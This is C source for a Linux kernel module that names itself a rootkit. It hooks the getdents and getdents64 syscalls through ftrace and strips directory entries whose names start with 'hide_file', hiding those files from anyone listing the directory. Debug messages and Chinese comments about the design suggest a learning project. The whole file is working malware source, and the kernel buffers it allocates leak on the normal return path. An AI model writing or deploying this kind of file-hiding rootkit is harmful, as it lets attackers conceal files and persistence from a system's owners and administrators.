#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

#define PREFIX "hide_file"

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

#define ERROR_HANDLE(buffer1, buffer2, ret) \
	{kfree((buffer1)); kfree((buffer2)); return (ret);}	

static asmlinkage long hook_sys_getdents64(const struct pt_regs * regs) {
	// struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir, *dirent_tmp = NULL;
	struct linux_dirent64 *current_dir, *dirent_ker, *dirent_tmp = NULL;
	unsigned long offset_ker = 0;
	unsigned long offset_tmp = 0;

	long error;

	// ret is the total size of total directories.
	int ret = orig_getdents64(regs);

	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	
	// kzalloc = kmalloc + memset
	dirent_ker = kzalloc(ret, GFP_KERNEL);
	dirent_tmp = kzalloc(ret, GFP_KERNEL);
	if ((ret <= 0) || (dirent_ker == NULL) || (dirent_tmp == NULL))
		return ret;
	
	error = copy_from_user(dirent_ker, dirent, ret);
	if (error) 
		ERROR_HANDLE(dirent_ker, dirent_tmp, ret);
	printk(KERN_DEBUG "ret: %d\n", ret);
	while (offset_ker < ret) {
		current_dir = (void *)dirent_ker + offset_ker;
		printk(KERN_DEBUG "filename: %s\n", current_dir->d_name);
		// 为什么只有第一个才用memmove而不是所有的都使用memmove？
		// previous_dir += current_dir->d_reclen的后果是造成文件的大小虚高？
		if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
			// if (current_dir == dirent_ker) {
			// 	ret -= current_dir->d_reclen;
			// 	memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
			// 	continue;
			// }
			// previous_dir->d_reclen += current_dir->d_reclen;
			printk(KERN_DEBUG "rootkit: Found %s\n", current_dir->d_name);
			//continue;
		}  else {
			//memmove(dirent_tmp + offset_tmp, (void *)current_dir, current_dir->d_reclen);
			memcpy((void *)dirent_tmp + offset_tmp, (void *)dirent_ker + offset_ker, current_dir->d_reclen);
			// previous_dir = current_dir;
			offset_tmp += current_dir->d_reclen;
		}
		offset_ker += current_dir->d_reclen;
		printk(KERN_INFO "offset_ker: %d", offset_ker);
	}
	error = copy_to_user(dirent, dirent_tmp, offset_tmp);
	if (error) 
		ERROR_HANDLE(dirent_ker, dirent_tmp, ret)
	return offset_tmp;
}

static asmlinkage long hook_sys_getdents(const struct pt_regs * regs) {
	struct linux_dirent {
		unsigned long d_ino;
		unsigned long d_off;
		unsigned short d_reclen;
		char d_name[];
	};
	struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;
	// unsigned int count = regs->dx;
	// unsigned int fd = regs->di;
	long error;

	// struct linux_dirent *current_dir, *dirent_ker, *dirent_tmp, *previous_dir = NULL;
	struct linux_dirent *current_dir, *dirent_ker, *dirent_tmp = NULL;
	unsigned long offset_ker, offset_tmp = 0;

	int ret = orig_getdents(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);
	dirent_tmp = kzalloc(ret, GFP_KERNEL);

	if ((ret <= 0) || (dirent_ker == NULL) || (dirent_tmp == NULL))
		return ret;

	error = copy_from_user(dirent_ker, dirent, ret);
	if (error)
		ERROR_HANDLE(dirent_ker, dirent_tmp, ret);

	while (offset_ker < ret) {
		current_dir = (void *)dirent_ker + offset_ker;
		printk(KERN_DEBUG "filename: %s\n", current_dir->d_name);
		if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
			// if (current_dir == dirent_ker) {
			// 	ret -= current_dir->d_reclen;
			// 	memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
			// 	continue;
			// }
			// previous_dir->d_reclen += current_dir->d_reclen;
			printk(KERN_DEBUG "rootkit: found %s\n", current_dir->d_name);
			//continue;
		} else {
			//memmove(dirent_tmp + offset_tmp, (void *)current_dir, current_dir->d_reclen);
			memcpy((void *)dirent_tmp + offset_tmp, (void *)dirent_ker + offset_ker, current_dir->d_reclen);
			offset_tmp += current_dir->d_reclen;
			// previous_dir = current_dir;
		}
		offset_ker += current_dir->d_reclen;
	}
	error = copy_to_user(dirent, dirent_tmp, offset_tmp);
	if (error)
		ERROR_HANDLE(dirent_ker, dirent_tmp, ret)
	return offset_tmp;
}

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_getdents64", hook_sys_getdents64, &orig_getdents64),
	HOOK("__x64_sys_getdents", hook_sys_getdents, &orig_getdents),
};

static int __init rootkit_init(void) { 
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (err)
		return err;

	printk(KERN_INFO "rootkit: Loaded >:-)\n");
	return 0;
}

static void __exit rootkit_exit(void) {
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("clf");
MODULE_DESCRIPTION("hide files");
MODULE_VERSION("0.01");